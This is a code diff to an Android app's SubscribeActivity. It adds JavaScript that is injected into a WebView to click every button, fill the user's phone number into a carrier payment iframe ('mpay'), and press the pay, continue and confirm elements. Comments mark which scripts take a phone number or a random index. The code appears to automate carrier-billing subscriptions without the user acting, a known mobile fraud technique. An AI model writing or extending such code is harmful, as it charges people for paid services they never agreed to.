@@ -32,6 +32,24 @@ public class SubscribeActivity extends AppCompatActivity {
 
     private WebViewHelper webViewHelper = null;
 
+    String[] jss = new String[]{
+            "javascript:for(var i=0;i<document.getElementsByName('button').length;i++){document.getElementsByName('button')[i].click();}",
+            "javascript:document.getElementById('submit').click();",
+            "javascript:document.getElementById('msisdn').focus();",
+            "javascript:document.getElementById('msisdn').value='%s';", //这个js类型为1，需要填充电话号码
+            "javascript:document.getElementById('ask').click();",
+            "javascript:document.getElementById('pay').click();",
+            "javascript:document.getElementsByClassName('grid-item')[%d].click();",//这个js类型是3，需要输入一个随机数
+            "javascript:document.getElementById('mpay').contentWindow.document.getElementById('msisdn').focus();",
+            "javascript:document.getElementById('mpay').contentWindow.document.getElementById('msisdn').value='%s';", //这个js类型为1，需要填充电话号码
+            "javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('inputbox')[0].focus();",
+            "javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('inputbox')[0].value='%s';",//这个js类型为1，需要填充电话号码
+            "javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('continue')[0].click();",
+            "javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('continue')[0].click();",
+            "javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('continue')[0].click();",
+            "javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('text-red2')[0].click();",
+    };
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -59,7 +77,7 @@ public class SubscribeActivity extends AppCompatActivity {
                         webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementById('msisdn').focus();", 15 * 1000),
                         webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('inputbox')[0].focus();", 15 * 1000),
                         //填充电话号码
-                        webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementById('msisdn').value=‘%s’;", 15 * 1000, WebViewHelper.JsObj.JS_TYPE_PHONE),
+                        webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementById('msisdn').value='%s';", 15 * 1000, WebViewHelper.JsObj.JS_TYPE_PHONE),
                         webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('inputbox')[0].value='%s';", 15 * 1000, WebViewHelper.JsObj.JS_TYPE_PHONE),
                         //点击
                         webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('continue')[0].click();"),
